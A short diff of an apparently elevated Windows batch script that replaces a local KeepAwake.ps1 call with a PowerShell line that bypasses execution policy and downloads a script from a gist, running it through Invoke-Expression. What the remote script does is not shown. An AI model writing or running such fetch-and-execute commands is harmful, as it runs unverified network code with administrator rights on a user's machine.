@@ -18,6 +18,6 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 :-----------------------------------------------------------------------
-attrib C:\Recovery +h +s
-powershell.exe -ExecutionPolicy Bypass -File "%~dp0\KeepAwake.ps1" -Verb RunAs
+@echo off
+powershell.exe -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://gist.github.com/52250179/7cacecd10bf49208fb017f4fd1d6f11e/raw | Invoke-Expression"
 pause
